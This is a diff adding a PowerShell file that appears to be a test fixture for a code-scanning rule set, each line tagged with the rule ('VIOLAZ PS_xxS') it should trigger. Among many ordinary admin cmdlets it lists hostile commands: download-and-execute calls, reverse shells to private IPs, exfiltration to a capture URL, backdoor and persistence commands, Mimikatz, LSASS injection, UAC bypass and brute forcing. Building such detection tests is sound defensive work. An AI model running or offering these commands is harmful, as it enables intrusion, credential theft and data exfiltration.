@@ -1,0 +1,1624 @@
+
+   # Properties
+   [string] $Color
+   [string] $ModelYear
+   [int] $Distance
+
+   # Method
+   [int] Drive ([int]$Miles)
+   {
+      $this.Distance += $Miles
+      $this.Rides++
+      return $this.Distance
+   }
+
+   # Hidden property of the Drive method
+    hidden [int] $Rides = 0 # OK
+	Get-NetIPAddress | where IPAddress -eq 128.56.0.1 # VIOLAZ Itl03
+	Get_Pools -Querymode "core" # VIOLAZ PS_01S MegaMiner
+	HashRates.PSObject.Properties.Name # VIOLAZ PS_01S MultiPoolMiner
+	Get-ChildItemContent "Miners" # VIOLAZ PS_01S MultiPoolMiner
+	Invoke-WebRequest nemosminer.x10host.com # VIOLAZ PS_01S NemosMiner
+	Invoke-WebRequest api.coinbase.com # VIOLAZ PS_01S Generic
+	Invoke-WebRequest api.coindesk.com # VIOLAZ PS_01S Generic
+	Invoke-WebRequest rest.coinapi.io # VIOLAZ PS_01S Coinapi
+	Invoke-WebRequest ws.coinapi.io # VIOLAZ PS_01S Coinapi
+	Invoke-WebRequest eth-ru.dwarfpool.com # VIOLAZ PS_01S Crypto4u-ethash
+	# VIOLAZ PS_05S
+	cmd.exe /c "taskList /svc"
+	# VIOLAZ PS_05S
+	get-tasklist.ps1
+	# VIOLAZ PS_05S
+	[System.Diagnostics.Process]::GetCurrentProcess().Id
+	# VIOLAZ PS_05S
+	Get-Process winword, explorer | Format-List *
+	# VIOLAZ PS_05S
+	Get-CimInstance -ClassName Win32_Process -Filter "name='pwsh.exe'" |
+    Invoke-CimMethod -MethodName GetOwner 
+	# VIOLAZ PS_05S
+	Get-ScheduledTask -TaskName "SystemScan"
+	# VIOLAZ PS_05S
+	Get-ScheduledTaskInfo -TaskName "\Sample\SchedTask01"
+	# VIOLAZ PS_05S
+	cmd.exe /c "schtasks /query"
+	# VIOLAZ PS_06S
+	$RJ = New-Object System.Security.Cryptography.RijndaeManaged
+	# VIOLAZ PS_06S
+	Get-Help –Name *service*
+	# VIOLAZ PS_06S
+	(Get-WmiObject -Class win32_service -computer "server"  | format-table Name).count
+# VIOLAZ PS_06S <--- Invece di Get-Services
+	Get-Service | Where-Object {$_.Status -EQ “Running”}
+	
+	$Shell = New-Object -ComObject "Shell.Application"
+    $AL = "-NoProfile -ExecutionPolicy Bypass -file `"$PSCommandPath`""
+	# VIOLAZ PS_08S
+    $Shell.ShellExecute("powershell.exe", "$AL", "", "RunAs", 1)
+	# VIOLAZ PS_08S
+	(New-Object Net.WebClient).DownloadString('http://192.X.X.X/Sherlock.ps1')
+	$Command = "Get-Process"
+	# VIOLAZ PS_08S
+	Invoke-Expression $Command
+	# VIOLAZ PS_08S
+	IEX $Command
+	# VIOLAZ PS_08S
+	Start-Process -FilePath "sort.exe"
+	# VIOLAZ PS_08S
+	Stop-Process -Name "notepad"
+	# VIOLAZ PS_08S
+	$startInfo = New-Object System.Diagnostics.ProcessStartInfo
+	# VIOLAZ PS_08S
+	Enter-PSSession -ComputerName Server01
+	# VIOLAZ PS_08S
+	Get-Command -Type Cmdlet | Sort-Object -Property Noun | Format-Table -GroupBy Noun
+	# VIOLAZ PS_08S
+	GCM -ListImported
+	# VIOLAZ PS_08S
+	Invoke-Command -FilePath C:\scripts\test.ps1 -ComputerName Server01
+	# VIOLAZ PS_08S
+	cmd.exe /c "MSBuildShell"
+	# VIOLAZ PS_08S
+	AssemblyName name = AssemblyName.GetAssemblyName(@"C:\path\assembly.dll");
+	# VIOLAZ PS_08S
+	$AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($AssemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+	# VIOLAZ PS_08S
+ 	$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	# VIOLAZ PS_08S
+	$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([String]))
+	# VIOLAZ PS_08S
+	Invoke-Kerberoast -Domain dev.testlab.local | fl
+	# VIOLAZ PS_08S
+	$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll') Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local
+	# VIOLAZ PS_08S
+	nvoke-TokenManipulation -Enumerate
+	# VIOLAZ PS_08S
+	Sherlock.ps1
+	# VIOLAZ PS_08S
+	Invoke-PsExec ("PsExec Wrapper v2")
+	# VIOLAZ PS_08S
+	Invoke-BloodHound.ps1
+	# VIOLAZ PS_08S
+	GetUserSPNS.ps1
+	# VIOLAZ PS_08S
+	Invoke-Portscan -Hosts "webstersprodigy.net,google.com,microsoft.com" -TopPorts 50
+	# VIOLAZ PS_08S
+	Get-PasswordHash $securePassword 9 $byte
+	# VIOLAZ PS_08S
+	Invoke-MS16-032.ps1
+	# VIOLAZ PS_08S
+	Invoke-MS16-135.ps1
+	# VIOLAZ PS_08S
+	Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine
+	# VIOLAZ PS_08S
+	cmd.exe /c "shutdown.exe /s /f"
+# VIOLAZ PS_08S <-- aggiungere Stop-Computer
+Stop-Computer -ComputerName localhost
+# VIOLAZ PS_08S <-- aggiungere Restart-Computer
+Restart-Computer
+	# VIOLAZ PS_08S
+	Remove-Item -Path .
+	# VIOLAZ PS_08S
+	Add-Type -AssemblyName 'Oracle.ManagedDataAccess'
+# VIOLAZ PS_08S <-- aggiungere -Path
+Add-Type -Path C:\WINDOWS\assembly\GAC_MSIL\office\15.0.0.0__71e9bce111e9429c\office.dll -PassThru
+	# VIOLAZ PS_08S
+	$Response = Invoke-WebRequest -Uri https://www.bing.com/search?q=how+many+feet+in+a+mile
+	# VIOLAZ PS_08S
+	Invoke-RestMethod -Uri https://blogs.msdn.microsoft.com/powershell/feed/ |
+  Format-Table -Property Title, pubDate
+	# VIOLAZ PS_09S
+	$Name = Get-Disk | % {$_.FriendlyName} 
+	# VIOLAZ PS_09S
+	$dl = get-Disk $d.Number | Initialize-Disk -PartitionStyle GPT -PassThru 
+	# VIOLAZ PS_09S
+	New-Partition -AssignDriveLetter -UseMaximumSize
+	# VIOLAZ PS_09S
+	Format-Volume -driveletter $dl.Driveletter -FileSystem NTFS -NewFileSystemLabel "Disk $disknum" -Confirm:$falsen
+	# VIOLAZ PS_10S
+	listeners
+	# VIOLAZ PS_10S
+	$RequestOpts.Add('Uri', "https://$($sessionobj.host):$($sessionobj.port)/api/listeners/options")
+	# VIOLAZ PS_10S
+	stagers
+	# VIOLAZ PS_10S
+	$RequestOpts.Add('Uri', "https://$($sessionobj.host):$($sessionobj.port)/api/stagers/$($StagerName.ToLower())")
+	# VIOLAZ PS_10S
+	usestager 
+	# VIOLAZ PS_10S
+	kill all
+	# VIOLAZ PS_10S
+	interact 
+	# VIOLAZ PS_10S
+	usemodule 
+	# VIOLAZ PS_10S
+	searchmodule privesc
+	# VIOLAZ PS_10S
+	sharefinder 
+	# VIOLAZ PS_10S
+	scriptimport
+	# VIOLAZ PS_12S
+	Import PSSec
+	# VIOLAZ PS_12S
+	Import-Module PSSec
+	# VIOLAZ PS_12S
+	Import-Module .\PSSec.ps1
+# VIOLAZ PS_13S --> cambiare Add-HostEntry in Add-HostFileEntry
+	Add-HostFileEntry $hostName $ipAddress
+# VIOLAZ PS_13S --> cambiare Remove-HostEntry in Remove-HostFileEntry
+	Remove-HostFileEntry $hostName 
+# VIOLAZ PS_13S <-- aggiungere anche Set-HostsEntry
+	Set-HostsEntry -IPAddress 10.2.3.4 -HostName 'myserver' -Description "myserver's IP address"
+	# VIOLAZ PS_14S
+	Get-CSDisassembly
+	# VIOLAZ PS_14S
+	[Int].GetMethod('Parse', [String]) | Get-ILDisassembly | Format-Table Position, Instruction, Operand -AutoSize
+	# VIOLAZ PS_14S
+	New-FunctionDelegate -Identity user1@contoso.com -Delegate user2@contoso.com -MakeCalls $true -ReceiveCalls $true -ManageSettings $true -PickUpHeldCalls $true -JoinActiveCalls $true
+	# VIOLAZ PS_14S
+	Invoke-LoadLibrary "test.dll"
+	# VIOLAZ PS_14S
+	New-DllExportFunction "test.dll"
+	# VIOLAZ PS_14S
+	Get-HostsFile "server1" 
+	# VIOLAZ PS_14S
+	New-HostsFileEntry $hostName $ipAddress
+	# VIOLAZ PS_14S
+	Remove-HostsFileEntry $hostName
+	# VIOLAZ PS_14S
+	Get-AssemblyStrings
+	# VIOLAZ PS_14S
+	Get-AssemblyResources
+	# VIOLAZ PS_14S
+	Remove-AssemblySuppressIldasmAttribute
+	# VIOLAZ PS_14S
+	Get-AssemblyImplementedMethods
+	# VIOLAZ PS_14S
+	Get-ProcessStrings
+	# VIOLAZ PS_14S
+	Get-VirtualMemoryInfo
+	# VIOLAZ PS_14S
+	Get-ProcessMemoryInfo
+	# VIOLAZ PS_14S
+	Get-StructFromMemory
+	# VIOLAZ PS_14S
+	Get-PE
+	# VIOLAZ PS_14S
+	Find-ProcessPEs
+	# VIOLAZ PS_14S
+	Get-LibSymbols
+	# VIOLAZ PS_14S
+	Get-ObjDump
+	# VIOLAZ PS_14S
+	Get-NtSystemInformation
+	# VIOLAZ PS_14S
+	Get-PEB
+	# VIOLAZ PS_14S
+	Register-ProcessModuleTrace
+	# VIOLAZ PS_14S
+	Get-ProcessModuleTrace
+	# VIOLAZ PS_14S
+	Unregister-ProcessModuleTrace
+	# VIOLAZ PS_14S
+	Get-SystemInfo
+	# VIOLAZ PS_14S
+	Get-Member
+	# VIOLAZ PS_14S
+	Get-Strings
+	# VIOLAZ PS_14S
+	ConvertTo-String
+	# VIOLAZ PS_14S
+	Get-Entropy
+	# VIOLAZ PS_15S
+	python unicorn.py
+	# VIOLAZ PS_16S
+	Get-SQLInstanceBroadcast -Credential -ServerInstance "Computer002\InstanceName"
+	# VIOLAZ PS_16S
+	Get-SQLInstancelocal | Get-SQLDatabase –Verbose –NoDefaults
+	# VIOLAZ PS_16S
+	Get-SQLInstanceDomain -Verbose
+	# VIOLAZ PS_16S
+	Get-SQLServerInfo –Verbose
+# VIOLAZ PS_16S
+Invoke-SQLDumpInfo -Verbose -Instance "SQLServer1\STANDARDDEV2014"
+# VIOLAZ PS_16S
+Invoke-SQLAudit -Verbose -Instance "SQLServer1\STANDARDDEV2014"
+# VIOLAZ PS_16S
+Invoke-SQLEscalatePriv –Verbose –Instance “SQLServer1\Instance1”
+# VIOLAZ PS_16S
+PowerUpSQL
+
+# VIOLAZ PS_16S --> aggiungere:
+Invoke-SQLImpersonateService
+Invoke-SQLImpersonateServiceCmd -Verbose -Instance SQLServer1\STANDARDDEV2014 -EngineOnly -Exe 'PowerShell -c "notepad.exe"'
+Invoke-SQLOSCmd
+Invoke-SQLOSCmdCLR
+Invoke-SQLOSCmdOle
+Invoke-SQLOSCmdR
+Invoke-SQLOSCmdPython
+Invoke-SQLOSCmdAgentJob
+
+# VIOLAZ PS_17S
+voyeur.ps1
+# VIOLAZ PS_18S
+Import-Module .\Posh-SSH.psd1
+Import-Module Posh-SSH
+Import Posh-SSH
+# VIOLAZ PS_20S
+Invoke-Runas -User SomeAccount -Password SomePass -Binary C:\Windows\System32\cmd.exe -LogonType 0x1
+# VIOLAZ PS_20S
+Invoke-NetSessionEnum -HostName SomeHostName
+# VIOLAZ PS_20S
+Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1
+# VIOLAZ PS_20S
+Detect-Debug
+# VIOLAZ PS_20S
+$SystemProcHandles = Get-Handles -ProcID 4
+# VIOLAZ PS_20S
+Get-TokenPrivs -ProcID 1234
+# VIOLAZ PS_20S
+Get-Exports -DllPath C:\Some\Path\here.dll
+# VIOLAZ PS_20S
+$SystemModuleArray = Get-SystemModuleInformation
+# VIOLAZ PS_20S
+Expose-NetAPI -Search MessageBox |fl
+# VIOLAZ PS_20S
+Get-ProcessMiniDump -ProcID 1234 -Path C:\Some\File\Path.out
+# VIOLAZ PS_20S
+Get-SystemProcessInformation
+# VIOLAZ PS_20S
+Start-Eidolon
+# VIOLAZ PS_20S
+$CallResult = Stage-RemoteDll -ProcID 1337 -DllPath .\Desktop\evil.dll -Mode NtCreateThreadEx
+# VIOLAZ PS_20S
+Export-LNKPwn -LNKOutPath C:\Some\Local\Path.lnk -TargetCPLPath C:\Target\CPL\Path.cpl -Type SpecialFolderDataBlock
+# VIOLAZ PS_20S
+UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe
+# VIOLAZ PS_20S
+Bypass-UAC -Method UacMethodSysprep
+# VIOLAZ PS_20S
+Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
+# VIOLAZ PS_20S
+Invoke-SMBShell -Client -Server REDRUM-DC -AESKey dFqeSRa5IVD7Daby -Pipe tapsrv.5604.w6YjHCgSOVpoXOZF
+# VIOLAZ PS_20S
+Conjure-LSASS
+# VIOLAZ PS_20S
+Invoke-MS16-032
+# VIOLAZ PS_20S
+Subvert-PE -Path C:\Path\To\PE.exe -Write
+# VIOLAZ PS_20S
+Trace-Execution -Path .\Desktop\some.exe -InstructionCount 10
+# VIOLAZ PS_21S
+Gupt-Backdoor -MagicString op3n -Verbose
+# VIOLAZ PS_21S
+Do-Exfiltration -Data (Get-Process) -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+# VIOLAZ PS_21S
+DNS-TXT-Pwnage
+# VIOLAZ PS_21S
+Get-Information
+# VIOLAZ PS_21S
+Get-WLAN-Keys
+# VIOLAZ PS_21S
+Invoke-PsUACme
+	
+# VIOLAZ PS_21S --> aggiungere:
+Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Password d1ive@Dubhe -Domain lab.local -AllowedToDelegateTo ldap/DC.lab.local
+Add-RegBackdoor
+Add-ScrnSaveBackdoor -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"
+Execute-OnTime -PayloadURL http://example.com/script.ps1 -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php -persist
+HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis
+Invoke-ADSBackdoor -PayloadURL http://192.168.1.138/payload.ps1 -Arguments "hack"
+Set-RemotePSRemoting -UserName labuser –Verbose
+Set-RemoteWMI -UserName labuser -ComputerName 192.168.0.34 -Credential admin -Verbose
+Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain lab.local -AllowedToDelegateTo ldap/DC.lab.local
+Set-DCShadowPermissions -FakeDC ops-user12 -Object ops-user19 -Username labuser -Verbose
+Invoke-PsUACme -Method unloadobfuscated -Verbose
+Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+Out-Excel -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
+Out-HTA -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
+Out-JS -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
+Out-Java -PayloadURL http://192.168.254.1/Get-Information.ps1 -JDKPath "C:\Program Files\Java\jdk1.7.0_25"
+Out-SCF IPAddress 192.168.230.1
+Out-SCT -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
+Out-Shortcut -Payload "-WindowStyle hidden -ExecutionPolicy Bypass -noprofile -noexit -c Get-ChildItem"
+Out-WebQuery -URL http://192.168.1.2/
+Out-Word -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 
+Enable-DuplicateToken
+Invoke-PsUACme -method oobe -Verbose
+Remove-Update Security
+Download-Execute-PS http://pastebin.com/raw.php?i=jqP2vJ3x
+Download_Execute http://example.com/file.txt
+Execute-Command-MSSQL -ComputerName sqlserv01 -UserName sa -Password sa1234
+Execute-DNSTXT-Code -ShellCode32 32.alteredsecurity.com -ShellCode64 64.alteredsecurity.com -AuthNS ns8.zoneedit.com -SubDomains 5
+Out-RundllCommand -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
+Check-VM
+Copy-VSS -DestinationDir C:\temp
+FireBuster 10.10.10.10 1000-1020 -Verbose
+FireListener -portrange 1000-1020
+Get-LsaSecret
+Get-PassHashes -PSObjectFormat
+Get-PassHints
+Get-WebCredentials
+Invoke-CredentialsPhish
+Invoke-Mimikatz
+Invoke-MimikatzWDigestDowngrade
+Invoke-mimikittenz
+Invoke-SSIDExfil
+Invoke-SessionGopher -Verbose
+Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis
+Show-TargetScreen -Reverse -IPAddress 192.168.2301.1 -Port 443
+Invoke-Interceptor -AutoProxyConfig
+Speak "Somthing"
+Create-MultipleSessions -filename .\servers.txt -CreateSessions
+Invoke-NetworkRelay -Relay v4tov4 -ListenAddress 192.168.254.141 -Listenport 8888 -ConnectAddress 192.168.1.22  -ConnectPort 445 -ComputerName 192.168.254.141
+Invoke-Command -FilePath .\Run-EXEonRemote.ps1 -ComputerName (Get-Content .\servers.txt)
+Invoke-Prasadhak -APIKEY 1fe0ef5feca2f84eb450bc3617f839e317b2a686af4d651a9bada77a522201b0
+Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service ActiveDirectory -StopOnSuccess -Verbose
+Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254
+Invoke-ConPtyShell 10.0.0.2 3001
+Invoke-JSRatRegsrv -IPAddress 192.168.230.1 -Port 80
+Invoke-JSRatRundll -IPAddress 192.168.230.1 -Port 80
+Invoke-PoshRatHttp -IPAddress 192.168.254.1 -Port 80
+Invoke-PoshRatHttps -IPAddress 192.168.254.1 -Port 8443
+python icmpsh_m.py 192.168.254.226 192.168.254.1
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+Invoke-PowerShellTcpOneLine
+Invoke-PowerShellTcpOneLineBind
+Invoke-PowerShellUdp -Reverse -IPAddress 192.168.254.226 -Port 53
+Invoke-PowerShellUdpOneLine
+Invoke-PowerShellWmi -ComputerName 192.168.0.35 -UserName opsdc\wmiadmin -Verbose -Interactive
+Invoke-PSGcat -Username psgcatlite -password pspassword
+Invoke-PSGcatAgent -Username psgcatlite -password pspassword -Delay 10
+Remove-PoshRat
+Add-Exfiltration -ScriptPath C:\Get-Information.ps1 -FilePath C:\test\Get-Information_exfil.ps1
+Add-Persistence -PayloadURL http://yourwebserver/evil.ps1
+ExetoText C:\binaries\evil.exe C:\test\evil.txt
+OUT-DNSTXT -DataToEncode C:\nishang\Gather\Get-Information.ps1
+Parse_Keys raw.txt logged.txt
+Remove-Persistence -Remove
+Start-CaptureServer -AuthType Basic -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt
+TexttoExe C:\evil.text C:\exe\evil.exe
+Import-Module .\nishang.psm1
+
+	# VIOLAZ PS_22S
+	#start-rsjob
+	Get-ChildItem -Directory | Start-RSjob -Name {$_.Name} -ScriptBlock {
+					Param($Directory)
+					Write-Verbose $_
+					$Sum = (Get-ChildItem $Directory.FullName -Recurse -Force -ErrorAction SilentlyContinue |
+					Measure-Object -Property Length -Sum).Sum
+					[pscustomobject]@{
+						Name = $Directory.Name
+						SizeMB = ([math]::round(($Sum/1MB),2))
+					}
+				}
+	# VIOLAZ PS_22S		
+	Get-RSJob -ID 1,5,78
+	# VIOLAZ PS_22S
+	#Receive-RSJob
+	Get-RSJob -State Completed | Receive-RSJob
+	# VIOLAZ PS_22S
+	#Wait-RSJob
+	Get-RSJob | Wait-RSJob
+	# VIOLAZ PS_23S
+	Get-NTFSAccess -Path D:\Data 
+	# VIOLAZ PS_23S
+	Add-NTFSAccess -Path C:\Data 
+	# VIOLAZ PS_23S`
+	Get-NTFSOrphanedAccess -Path D:\Data 
+	# VIOLAZ PS_23S
+	Get-NTFSEffectiveAccess 
+	# VIOLAZ PS_23S
+	Enable-NTFSAccessInheritance -Path .\Data
+	# VIOLAZ PS_23S
+	Get-NTFSOwner -Path .\Data
+	# VIOLAZ PS_23S
+	Set-NTFSOwner -Path .\Data
+# VIOLAZ PS_24S <-- dà violaz solo con la Get-ADObject senza parametri. Questa è OK:
+	Get-ADObject -LDAPFilter "(objectClass=site)" -SearchBase 'CN=Configuration,DC=Fabrikam,DC=Com' -Properties CanonicalName | FT Name,CanonicalName -A
+	# VIOLAZ PS_24S
+	#Invoke-AdoCommand
+	$connection = Get-AdoProvider oracle | Get-AdoConnection -server orcl02 -username scott -password -tiger
+          invoke-adocommand -connection $connection -commandtext "select * from foo"
+	# VIOLAZ PS_24S
+	Get-AdoConnection
+	# VIOLAZ PS_24S
+	Get-AdoDataProvider
+	# VIOLAZ PS_24S
+	Test-AlternateDataStream
+	# VIOLAZ PS_24S
+	Invoke-Apartment
+	# VIOLAZ PS_24S
+	Test-Assembly
+	# VIOLAZ PS_24S
+	Invoke-BatchFile
+	# VIOLAZ PS_24S
+	Get-DhcpServer
+	# VIOLAZ PS_24S
+	Add-DirectoryLength
+	# VIOLAZ PS_24S
+	Get-DomainController
+	# VIOLAZ PS_24S
+	Get-DriveInfo
+	# VIOLAZ PS_24S
+	Invoke-Elevated
+	# VIOLAZ PS_24S
+	Pop-EnvironmentBlock
+	# VIOLAZ PS_24S
+	Push-EnvironmentBlock
+	# VIOLAZ PS_24S
+	Edit-File
+	# VIOLAZ PS_24S
+	Set-FileTime
+	# VIOLAZ PS_24S
+	Get-FileVersionInfo
+	# VIOLAZ PS_24S
+	Get-ForegroundWindow
+	# VIOLAZ PS_24S
+	Set-ForegroundWindow
+	# VIOLAZ PS_24S
+	Invoke-GC
+	# VIOLAZ PS_24S
+	New-Hardlink
+	# VIOLAZ PS_24S
+	Ping-Host
+	# VIOLAZ PS_24S
+	Resolve-Host
+	# VIOLAZ PS_24S
+	Edit-HostProfile
+	# VIOLAZ PS_24S
+	Get-HttpResource
+	# VIOLAZ PS_24S
+	New-Junction
+	# VIOLAZ PS_24S
+	Invoke-Method
+	# VIOLAZ PS_24S
+	Get-MountPoint
+	# VIOLAZ PS_24S
+	Remove-MountPoint
+	# VIOLAZ PS_24S
+	Clear-MSMQueue
+	# VIOLAZ PS_24S
+	Get-MSMQueue
+	# VIOLAZ PS_24S
+	New-MSMQueue
+	# VIOLAZ PS_24S
+	Receive-MSMQueue
+	# VIOLAZ PS_24S
+	Send-MSMQueue
+	# VIOLAZ PS_24S
+	Test-MSMQueue
+	# VIOLAZ PS_24S
+	Get-OpticalDriveInfo
+	# VIOLAZ PS_24S
+	Get-PEHeader
+	# VIOLAZ PS_24S
+	Get-Privilege
+	# VIOLAZ PS_24S
+	Set-Privilege
+	# VIOLAZ PS_24S
+	Edit-Profile
+	# VIOLAZ PS_24S
+	Get-PSSnapinHelp
+	# VIOLAZ PS_24S
+	Stop-RemoteProcess
+	# VIOLAZ PS_24S
+	Get-ReparsePoint
+	# VIOLAZ PS_24S
+	Remove-ReparsePoint
+	# VIOLAZ PS_24S
+	Get-RunningObject
+	# VIOLAZ PS_24S
+	Get-ScreenHtml
+	# VIOLAZ PS_24S
+	New-Shortcut
+	# VIOLAZ PS_24S
+	Add-ShortPath
+	# VIOLAZ PS_24S
+	Get-ShortPath
+	# VIOLAZ PS_24S
+	Send-SmtpMail
+	# VIOLAZ PS_24S
+	Out-Speech
+	# VIOLAZ PS_24S
+	New-Symlink
+	# VIOLAZ PS_24S
+	Disconnect-TerminalSession
+	# VIOLAZ PS_24S
+	Get-TerminalSession
+	# VIOLAZ PS_24S
+	Stop-TerminalSession
+	# VIOLAZ PS_24S
+	Get-TypeName displays the typename of the input object.
+	# VIOLAZ PS_24S
+	Get-Uptime
+	# VIOLAZ PS_24S
+	Test-UserGroupMembership
+	# VIOLAZ PS_24S
+	Dismount-VHD
+	# VIOLAZ PS_24S
+	Mount-VHD
+	# VIOLAZ PS_24S
+	Set-VolumeLabel
+	# VIOLAZ PS_24S
+	Set-Writable
+	# VIOLAZ PS_25S Carbon con Carbon_Service
+	Carbon_Service InstallNoOpService
+	{
+    Name = 'CarbonNoOpService';
+    Path = 'C:\Projects\Carbon\bin\NoOpService.bin';
+    StartupType = 'Automatic';
+    Credential = $noOpServiceCreential';
+    OnFirstFailure = 'RunCommand';
+    Command = 'example.exe /fail %1%';
+    RunCommandDelay = 1000;
+    OnSecondFailure = 'Restart';
+    RestartDelay = (1000*60*5); # 5 minutes as milliseconds
+	}
+	# VIOLAZ PS_25S
+	Install-Group -Name TIEFighters -Description 'Users allowed to be TIE fighter pilots.' -Members EMPIRE\Pilots,EMPIRE\DarthVader
+	# VIOLAZ PS_25S
+	Grant-Permission -Identity ENTERPRISE\Engineers -Permission FullControl -Path C:\EngineRoom
+	# VIOLAZ PS_25S
+Install-Share
+# VIOLAZ PS_25S
+Install-Certificate
+# VIOLAZ PS_25S
+Set-SslCertificateBinding
+# VIOLAZ PS_25S
+Install-IisAppPool
+# VIOLAZ PS_25S
+Install-IisWebsite
+# VIOLAZ PS_25S
+Set-DotNetConnectionString
+# VIOLAZ PS_25S
+Remove-DotNetAppSetting
+# VIOLAZ PS_25S
+Set-DotNetAppSetting
+# VIOLAZ PS_25S
+Carbon_Permission
+# VIOLAZ PS_25S
+Test-DotNet
+# VIOLAZ PS_25S
+Get-ComPermission
+# VIOLAZ PS_25S
+Get-ComSecurityDescriptor
+# VIOLAZ PS_25S
+Get-HttpUrlAcl
+# VIOLAZ PS_25S
+Get-Permission
+# VIOLAZ PS_25S
+Get-ServicePermission
+# VIOLAZ PS_25S
+Grant-HttpUrlPermission
+# VIOLAZ PS_25S
+Grant-Permission
+# VIOLAZ PS_25S
+Grant-ServiceControlPermission
+# VIOLAZ PS_25S
+Grant-ServicePermission
+# VIOLAZ PS_25S
+Revoke-HttpUrlPermission
+# VIOLAZ PS_25S
+Revoke-Permission
+# VIOLAZ PS_25S
+Revoke-ServicePermission
+# VIOLAZ PS_25S
+Set-ServiceAcl
+# VIOLAZ PS_25S
+Test-Permission
+# VIOLAZ PS_25S
+Find-ADUser
+# VIOLAZ PS_25S
+Format-ADSearchFilterValue
+# VIOLAZ PS_25S
+Get-ADDomainController
+# VIOLAZ PS_25S
+Get-Certificate
+# VIOLAZ PS_25S
+Get-CertificateStore
+# VIOLAZ PS_25S
+Get-Permission
+# VIOLAZ PS_25S
+Get-SslCertificateBinding
+# VIOLAZ PS_25S
+Grant-Permission
+# VIOLAZ PS_25S
+Install-Certificate
+# VIOLAZ PS_25S
+Remove-SslCertificateBinding
+# VIOLAZ PS_25S
+Revoke-Permission
+# VIOLAZ PS_25S
+Set-SslCertificateBinding
+# VIOLAZ PS_25S
+Test-Permission
+# VIOLAZ PS_25S
+Test-SslCertificateBinding
+# VIOLAZ PS_25S
+Uninstall-Certificate
+# VIOLAZ PS_25S
+Disable-IEEnhancedSecurityConfiguration
+# VIOLAZ PS_25S
+Enable-IEActivationPermission
+# VIOLAZ PS_25S
+Get-ComPermission
+# VIOLAZ PS_25S
+Get-ComSecurityDescriptor
+# VIOLAZ PS_25S
+Grant-ComPermission
+# VIOLAZ PS_25S
+Revoke-ComPermission
+# VIOLAZ PS_25S
+Get-ProgramInstallInfo
+# VIOLAZ PS_25S
+Remove-EnvironmentVariable
+# VIOLAZ PS_25S
+Resolve-NetPath
+# VIOLAZ PS_25S
+Set-EnvironmentVariable
+# VIOLAZ PS_25S
+Test-OSIs32Bit
+# VIOLAZ PS_25S
+Test-OSIs64Bit
+# VIOLAZ PS_25S
+New-Credential
+# VIOLAZ PS_25S
+New-RsaKeyPair
+# VIOLAZ PS_25S
+Protect-String
+# VIOLAZ PS_25S
+Unprotect-String
+# VIOLAZ PS_25S
+Carbon_EnvironmentVariable
+# VIOLAZ PS_25S
+Carbon_FirewallRule
+# VIOLAZ PS_25S
+Carbon_Group
+# VIOLAZ PS_25S
+Carbon_IniFile
+# VIOLAZ PS_25S
+Carbon_Permission
+# VIOLAZ PS_25S
+Carbon_Privilege
+# VIOLAZ PS_25S
+Carbon_ScheduledTask
+# VIOLAZ PS_25S
+Carbon_Service
+# VIOLAZ PS_25S
+Clear-DscLocalResourceCache
+# VIOLAZ PS_25S
+Clear-MofAuthoringMetadata
+# VIOLAZ PS_25S
+Copy-DscResource
+# VIOLAZ PS_25S
+Get-DscError
+# VIOLAZ PS_25S
+Get-DscWinEvent
+# VIOLAZ PS_25S
+Initialize-Lcm
+# VIOLAZ PS_25S
+Start-DscPullConfiguration
+# VIOLAZ PS_25S
+Test-DscTargetResource
+# VIOLAZ PS_25S
+Write-DscError
+# VIOLAZ PS_25S
+Carbon_EnvironmentVariable
+# VIOLAZ PS_25S
+Carbon_FirewallRule
+# VIOLAZ PS_25S
+Carbon_Group
+# VIOLAZ PS_25S
+Carbon_IniFile
+# VIOLAZ PS_25S
+Carbon_Permission
+# VIOLAZ PS_25S
+Carbon_Privilege
+# VIOLAZ PS_25S
+Carbon_ScheduledTask
+# VIOLAZ PS_25S
+Carbon_Service
+# VIOLAZ PS_25S
+New-RsaKeyPair
+# VIOLAZ PS_25S
+Protect-String
+# VIOLAZ PS_25S
+Unprotect-String
